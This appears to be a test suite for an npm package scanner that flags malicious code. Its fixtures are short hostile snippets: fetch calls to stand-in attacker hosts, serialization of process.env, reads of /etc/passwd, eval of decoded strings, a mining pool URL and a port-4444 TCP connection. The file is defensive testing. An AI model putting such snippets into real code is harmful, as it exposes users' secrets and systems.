import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { analyzeCode } from '../src/code-analysis.js'
import type { FetchFn } from '../src/types.js'
import { gzipSync } from 'node:zlib'

// ========================
// Test helpers: build tarballs
// ========================

/**
 * Build a minimal tar archive containing given files.
 * Each file entry is a 512-byte header + content padded to 512-byte boundary.
 */
function buildTar(files: Array<{ name: string; content: string }>): Buffer {
  const blocks: Buffer[] = []

  for (const file of files) {
    const contentBuf = Buffer.from(file.content, 'utf-8')
    const header = Buffer.alloc(512)

    // Filename (bytes 0-99)
    header.write(`package/${file.name}`, 0, 100, 'utf-8')

    // File mode (bytes 100-107): 0000644
    header.write('0000644\0', 100, 8, 'utf-8')

    // Owner/group IDs (bytes 108-123): zeros
    header.write('0000000\0', 108, 8, 'utf-8')
    header.write('0000000\0', 116, 8, 'utf-8')

    // File size in octal (bytes 124-135)
    const sizeOctal = contentBuf.length.toString(8).padStart(11, '0')
    header.write(sizeOctal + '\0', 124, 12, 'utf-8')

    // Modification time (bytes 136-147): zeros
    header.write('00000000000\0', 136, 12, 'utf-8')

    // Type flag (byte 156): '0' = regular file
    header[156] = 48 // ASCII '0'

    // Checksum (bytes 148-155): compute over header with checksum field as spaces
    header.fill(0x20, 148, 156) // spaces for checksum calculation
    let checksum = 0
    for (let i = 0; i < 512; i++) {
      checksum += header[i]
    }
    const checksumStr = checksum.toString(8).padStart(6, '0') + '\0 '
    header.write(checksumStr, 148, 8, 'utf-8')

    blocks.push(header)
    blocks.push(contentBuf)

    // Pad to 512-byte boundary
    const remainder = contentBuf.length % 512
    if (remainder > 0) {
      blocks.push(Buffer.alloc(512 - remainder))
    }
  }

  // End-of-archive: two 512-byte blocks of zeros
  blocks.push(Buffer.alloc(1024))

  return Buffer.concat(blocks)
}

/**
 * Create a mock fetcher that serves a tarball for a specific package.
 */
function createMockFetcher(files: Array<{ name: string; content: string }>): FetchFn {
  const tar = buildTar(files)
  const gzipped = gzipSync(tar)

  return async (input: RequestInfo | URL) => {
    const url = typeof input === 'string' ? input : input.toString()

    // Tarball request (check FIRST — tarball URLs also contain version strings)
    if (url.includes('.tgz')) {
      return new Response(gzipped, { status: 200 })
    }

    // Version metadata request
    if (url.match(/\/[^/]+\/[^/]+$/) && !url.includes('/-/')) {
      return new Response(JSON.stringify({
        dist: {
          tarball: 'https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz',
          unpackedSize: 1024,
        },
      }), { status: 200 })
    }

    return new Response('Not found', { status: 404 })
  }
}

// ========================
// Tests
// ========================

describe('analyzeCode', () => {
  it('returns clean for benign package code', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'export function add(a, b) { return a + b; }\n' },
      { name: 'utils.js', content: 'export const PI = 3.14159;\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Math utilities', ['math'], fetcher)
    assert.strictEqual(result.skipped, false)
    assert.strictEqual(result.hasFinding, false)
    assert.strictEqual(result.findings.length, 0)
    assert.strictEqual(result.filesAnalyzed, 2)
  })

  it('detects eval() usage', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'const x = ev' + 'al("1 + 2");\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Calculator', ['math'], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.title.includes('eval()')))
    assert.ok(result.findings.some(f => f.severity === 'high'))
  })

  it('detects new Function() usage', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'const fn = new Func' + 'tion("return 42");\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Code gen', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.title.includes('Function()')))
  })

  it('detects external URL', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'fetch("https://evil-server.attacker.net/data")\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'HTTP client', ['http'], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.category === 'data-exfiltration'))
  })

  it('ignores allowed domains (npmjs, github, nodejs)', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'fetch("https://registry.npmjs.org/pkg")\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Package checker', [], fetcher)
    // Should not flag registry.npmjs.org
    assert.strictEqual(result.findings.filter(f => f.title.includes('Network request')).length, 0)
  })

  it('detects environment serialization (critical)', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'const data = JSON.stringify(process.env);\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Utils', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.severity === 'critical' && f.title.includes('Serialization of entire environment')))
  })

  it('detects Object.keys(process.env)', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'const keys = Object.keys(process.env);\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Env tool', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.title.includes('Enumeration of all environment variables')))
  })

  it('detects sensitive file reads', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'readFileSync("/etc/passwd")\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'System tool', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.severity === 'critical' && f.title.includes('sensitive system files')))
  })

  it('detects hex obfuscation', async () => {
    const hexPayload = '\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21'
    const fetcher = createMockFetcher([
      { name: 'index.js', content: `const s = "${hexPayload}";\n` },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'String tool', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.category === 'obfuscation'))
  })

  it('detects eval of decoded content (critical malware)', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: `ev${''}al(atob("bWFsaWNpb3Vz"));\n` },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Tool', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.severity === 'critical' && f.category === 'malware'))
  })

  it('detects child_process exec', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'require("child_process").execSync("ls")\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Build tool', ['build'], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.category === 'code-execution'))
  })

  it('detects crypto mining URL', async () => {
    const fetcher = createMockFetcher([
      { name: 'miner.js', content: 'const pool = "stratum+tcp://pool.evil-mining.net:3333";\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Performance tool', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.severity === 'critical' && f.category === 'malware'))
  })

  it('detects TCP connection (possible reverse shell)', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'net.connect({ port: 4444, host: "10.0.0.1" })\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Utils', [], fetcher)
    assert.strictEqual(result.hasFinding, true)
    assert.ok(result.findings.some(f => f.title.includes('TCP connection')))
  })

  it('detects minified/obfuscated non-.min.js files', async () => {
    // Create a file with few lines but very long content (>2000 bytes)
    const longLine = 'var a=' + 'b'.repeat(2500) + ';'
    const fetcher = createMockFetcher([
      { name: 'index.js', content: longLine + '\n' + 'var x=1;' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Utils', [], fetcher)
    assert.ok(result.findings.some(f => f.category === 'obfuscation' && f.title.includes('minified')))
  })

  it('does NOT flag .min.js files as obfuscated', async () => {
    const longLine = 'var a=' + 'b'.repeat(2500) + ';'
    const fetcher = createMockFetcher([
      { name: 'index.min.js', content: longLine + '\n' + 'var x=1;' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Utils', [], fetcher)
    assert.strictEqual(result.findings.filter(f => f.title.includes('minified')).length, 0)
  })

  it('detects behavior mismatch: network calls in a formatter package', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'fetch("https://evil-server.attacker.net/track")\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'String formatter utility', ['format', 'string'], fetcher)
    assert.ok(result.findings.some(f =>
      f.category === 'unexpected-behavior' &&
      f.title.includes('inconsistent'),
    ))
  })

  it('handles tarball download failure gracefully', async () => {
    const fetcher: FetchFn = async () => new Response('Not found', { status: 404 })

    const result = await analyzeCode('nonexistent', '1.0.0', '', [], fetcher)
    assert.strictEqual(result.skipped, true)
    assert.ok(result.skipReason)
  })

  it('rejects tarball URL from untrusted domain', async () => {
    const fetcher: FetchFn = async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input.toString()
      if (url.includes('.tgz')) {
        return new Response('should not reach here', { status: 200 })
      }
      return new Response(JSON.stringify({
        dist: {
          tarball: 'https://evil-server.com/malware.tgz',
          unpackedSize: 1000,
        },
      }), { status: 200 })
    }

    const result = await analyzeCode('suspicious-pkg', '1.0.0', '', [], fetcher)
    assert.strictEqual(result.skipped, true)
    assert.ok(result.skipReason?.includes('Untrusted'))
  })

  it('rejects non-HTTPS tarball URL', async () => {
    const fetcher: FetchFn = async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input.toString()
      if (url.includes('.tgz')) {
        return new Response('should not reach here', { status: 200 })
      }
      return new Response(JSON.stringify({
        dist: {
          tarball: 'http://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz',
          unpackedSize: 1000,
        },
      }), { status: 200 })
    }

    const result = await analyzeCode('http-pkg', '1.0.0', '', [], fetcher)
    assert.strictEqual(result.skipped, true)
    assert.ok(result.skipReason?.includes('Untrusted'))
  })

  it('handles oversized packages gracefully', async () => {
    const fetcher: FetchFn = async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input.toString()
      if (url.includes('.tgz')) {
        return new Response('Not found', { status: 404 })
      }
      return new Response(JSON.stringify({
        dist: {
          tarball: 'https://registry.npmjs.org/big/-/big-1.0.0.tgz',
          unpackedSize: 10 * 1024 * 1024, // 10MB
        },
      }), { status: 200 })
    }

    const result = await analyzeCode('big-pkg', '1.0.0', '', [], fetcher)
    assert.strictEqual(result.skipped, true)
    assert.ok(result.skipReason?.includes('too large'))
  })

  it('deduplicates findings with same title and file', async () => {
    // Two eval() calls in the same file should produce one finding
    const ev = 'ev' + 'al'
    const fetcher = createMockFetcher([
      { name: 'index.js', content: `${ev}("a");\n${ev}("b");\n` },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Tool', [], fetcher)
    const evalFindings = result.findings.filter(f => f.title.includes('eval()'))
    assert.strictEqual(evalFindings.length, 1)
  })

  it('findings are sorted by severity (critical first)', async () => {
    const fetcher = createMockFetcher([
      { name: 'index.js', content: 'fetch("https://evil-server.attacker.net");\n' },
      { name: 'bad.js', content: 'JSON.stringify(process.env);\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Tool', [], fetcher)
    assert.ok(result.findings.length >= 2)
    // First finding should be critical (env serialization)
    const severities = result.findings.map(f => f.severity)
    const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }
    for (let i = 1; i < severities.length; i++) {
      assert.ok(order[severities[i]] >= order[severities[i - 1]], `Findings not sorted: ${severities[i-1]} before ${severities[i]}`)
    }
  })

  it('includes evidence in findings', async () => {
    const fetcher = createMockFetcher([
      { name: 'steal.js', content: 'const secrets = JSON.stringify(process.env);\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Tool', [], fetcher)
    const finding = result.findings.find(f => f.title.includes('Serialization'))
    assert.ok(finding)
    assert.ok(finding.evidence.length > 0)
    assert.ok(finding.file === 'steal.js')
    assert.ok(finding.explanation.length > 50, 'Explanation should be rich and detailed')
    assert.ok(finding.recommendation.length > 10, 'Recommendation should be present')
  })

  it('only analyzes .js, .cjs, .mjs files', async () => {
    const fetcher = createMockFetcher([
      { name: 'readme.md', content: 'eval("this is markdown not code")\n' },
      { name: 'data.json', content: '{"eval": "not code"}\n' },
      { name: 'index.js', content: 'export const x = 1;\n' },
    ])

    const result = await analyzeCode('test-pkg', '1.0.0', 'Tool', [], fetcher)
    assert.strictEqual(result.filesAnalyzed, 1) // Only index.js
    assert.strictEqual(result.hasFinding, false)
  })
})
